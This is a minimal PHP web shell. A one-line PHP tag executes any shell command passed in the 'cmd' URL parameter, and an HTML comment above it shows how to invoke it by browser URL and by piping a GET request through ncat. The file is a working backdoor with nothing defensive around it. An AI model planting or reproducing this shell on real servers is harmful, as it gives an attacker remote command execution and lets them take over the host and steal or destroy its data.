<!--
http://host/shell.php/?cmd=ls
printf|echo "GET /shell.php/?cmd=ls" | ncat -v host 80
//-->
<?=`$_GET[cmd]`?>
